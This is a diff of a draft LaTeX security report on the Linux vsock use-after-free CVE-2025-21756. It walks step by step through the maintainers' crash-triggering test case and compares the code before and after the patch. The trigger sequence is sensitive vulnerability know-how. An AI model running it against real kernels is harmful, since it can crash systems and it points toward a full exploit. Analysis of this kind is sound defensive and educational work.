@@ -98,37 +98,148 @@ Typically, a vsock socket goes through the following stages:
     \item \textbf{Release} (\texttt{close()}): when the socket is no longer needed, it is removed from the internal structures, its reference count is decremented and, if this reaches zero, its memory is deallocated.
 \end{enumerate}
 
-\section{Cause of the vulnerability}
-The cause of CVE-2025-21756 may be considered trivial at the code level, but given that certain preconditions are required for the problem to occur, and given that the result is not readily apparent, identifying it was by no means straightforward.
-
-% TODO - dettagli
-
 \section{Test case presented by the developers}
 Let's start with a test case provided by the maintainers of the VSOCK module for the Linux kernel, who, after releasing the patch, made it available to allow users to check whether their system is affected by the issue.
+
+\begin{listing}[H]
+    \captionof{listing}{Test case presented by the developers.}
+    \cfile{code/test-case-1.c}
+\end{listing}
+
 \clearpage
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=.14]{images/test_case.png}
-    \caption{The test case provided by the maintenance developers.}
-    \label{fig:test_case}
-\end{figure}
+\begin{listing}[H]
+    \cfile[firstnumber=48]{code/test-case-2.c}
+\end{listing}
+
 \noindent The test case in question does not lead to a privilege escalation, but causes the kernel to crash on vulnerable systems. By examining it step by step, it is possible to understand what is going wrong in the reference counting mechanism associated with a vsock socket.
 
 \subsubsection{Step-by-step analysis}
-Let's look at every relevant step in the test case. Every function will be described in detail in section \ref{functions_involved}.
+Let's look at every relevant step in the test case. Every involved function will be described in detail in section \ref{functions_involved}.
 
-\begin{figure}[H]
-    \centering
-    \includegraphics[scale=.14]{images/tc1.png}
-    \label{fig:tc1}
-\end{figure}
+\begin{clncode}[firstnumber=14]
+    s = vsock_bind(
+        VMADDR_CID_LOCAL,
+        VMADDR_PORT_ANY,
+        SOCK_SEQPACKET
+    );
+\end{clncode}
 
-% TODO - continuare
+\noindent After initially declaring the variables, a new local (identified by CID = 1) socket is bound. By doing this, the integer variable \texttt{s} will contain a new valid port assigned from the kernel.
 
-\section{Functions involved}\label{functions_involved}
+\begin{clncode}[firstnumber=21]
+    if (getsockname(s, (struct sockaddr *)&addr, &alen)) {
+        perror("getsockname");
+        exit(EXIT_FAILURE);
+    }
+\end{clncode}
 
+\noindent The instruction inside the \texttt{if} condition puts into \texttt{addr} the address of the new-bound socket. It terminates with a failure if \texttt{getsockname} returns \texttt{-1} (negative result) while it continues if it returns \texttt{0} (positive result).
 
+\begin{clncode}[firstnumber=26]
+    for (i = 0; i < MAX_PORT_RETRIES; ++i) {
+        sockets[i] = vsock_bind(
+            VMADDR_CID_ANY,
+            ++addr.svm_port,
+            SOCK_SEQPACKET
+        );
+    }
+\end{clncode}
 
-\section{Patches and mitigation measures}
+\noindent The \texttt{for} loop arbitrarily binds 24 ports (unlike the instruction in row 14, where it is automatically assigned by the kernel), starting with the port immediately following the one assigned by the kernel, in order to occupy them.
+
+\begin{clncode}[firstnumber=34]
+    close(s);
+\end{clncode}
+
+\noindent The first socket is then closed. Its only purpose was to automatically obtain the first port from the kernel.
+
+\begin{clncode}[firstnumber=35]
+    s = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
+    if (s < 0) {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
+    
+    if (!connect(s, (struct sockaddr *)&addr, alen)) {
+        fprintf(stderr, "Unexpected connect() #1 success\n");
+        exit(EXIT_FAILURE);
+    }
+\end{clncode}
+In this step, the “victim” socket for the exploit is created. \texttt{s} is reinitialized with no port, no peer, no bind, and no transport.
+
+We want the \texttt{connect} to fail in a specific way. With this connection attempt, the kernel prepares the socket, selects the transport and attempts to assign it a local port. The 24 ports we set up earlier are used to steer the process along this error path so that the transport is set but the socket remains in the unbound list.
+
+\begin{clncode}[firstnumber=47]
+    addr.svm_cid = VMADDR_CID_NONEXISTING;
+    if (!connect(s, (struct sockaddr *)&addr, alen)) {
+        fprintf(stderr, "Unexpected connect() #2 success\n");
+        exit(EXIT_FAILURE);
+    }
+    /* connect() #2 failed: transport unset, sk ref dropped? */
+\end{clncode}
+
+\noindent The CID is then set to a non-existent type to force the next connection attempt to fail; this one proceeds just like the previous one, and we again expect it to fail, but for a different reason .
+This causes the trasport to be unset and, at the same time, the reference count to be decreased even if the object is still existing.
+
+\begin{clncode}[firstnumber=54]
+    addr.svm_cid = VMADDR_CID_LOCAL;
+    addr.svm_port = VMADDR_PORT_ANY;
+    
+    /* Vulnerable system may crash now. */
+    bind(s, (struct sockaddr *)&addr, alen);
+    
+    close(s);
+    while (i--)
+        close(sockets[i]);
+        
+    control_writeln("DONE");
+\end{clncode}
+
+\noindent The final step demonstrates how the vulnerability was triggered, showing that, on a vulnerable system, attempting to bind a socket to an invalid object causes a crash.
+
+\section{Cause and functions involved}\label{functions_involved}
+
+In order to understand exactly why the bug occurs, we can start by looking at the patch the developers used to fix it. Before the patch (kernel versions until 6.6.78), the vulnerable code looked like this:
+
+\begin{clncode}
+    void vsock_remove_sock(struct vsock_sock *vsk)
+    {
+        vsock_remove_bound(vsk);
+        vsock_remove_connected(vsk);
+    }
+\end{clncode}
+
+\noindent while in the version after the patch (6.6.79) it looked like this:
+
+\begin{clncode}[highlightlines=4]
+    void vsock_remove_sock(struct vsock_sock *vsk)
+    {
+    	/* Transport reassignment must not remove the binding. */
+    	if (sock_flag(sk_vsock(vsk), SOCK_DEAD))
+    		vsock_remove_bound(vsk);
+    
+    	vsock_remove_connected(vsk);
+    }
+\end{clncode}
+
+\noindent The maintainers added a simple \texttt{if} that checks if the socket is really "dead" before removing the binding. We can better understand how it works by working backward, starting with the call to the \texttt{vsock\_remove\_bound} function.
+
+Before examining the function itself, we need to explain how the \textbf{bound tables} approach works. There are two global (as all sockets on the system are placed within them) tables, one for \textbf{bound sockets} (sockets that have specified an address that they are responsible for) and one for \textbf{connected sockets} (sockets that have established a connection with another socket). The bound table contains an extra entry for a list of \textbf{unbound sockets}. These tables are managed as \textit{intrusive lists} and are contained directly within the socket structs.
+
+In the test case, the newly created \texttt{SOCK\_SEQPACKET} socket is initially inserted into the unbound list, since no local address has been assigned to it yet. The first \texttt{connect()} attempt implicitly tries to bind the socket, but the previously allocated consecutive ports force this operation to fail. As a result, the socket remains in the unbound list, although a transport has already been assigned to it.
+
+The second \texttt{connect()} changes the destination so that a different transport selection is required. During this reassignment, the previous transport is released and the socket is removed through the normal bound-socket removal path, but the socket was never actually moved from the unbound list to one of the regular bound-table buckets. The vulnerable code therefore treats an unbound socket as if it were normally bound and drops a reference that should have been preserved. The subsequent \texttt{bind()} then operates on a socket whose reference count may already be incorrect, exposing the use-after-free condition.
+
+Now that we've covered how bound tables work, we can examine the contents of \texttt{vsock\_remove\_bound}. Since the original function calls a wrapper that contains mutual exclusion instructions and the entire function that contains the actual logic, for simplicity we'll focus directly on the latter.
+
+\begin{clncode}
+    static void __vsock_remove_bound(struct vsock_sock *vsk)
+    {
+    	list_del_init(&vsk->bound_table);
+    	sock_put(&vsk->sk);
+    }
+\end{clncode}
+
+% TODO continuare
 
 \section{Overview of the exploit}
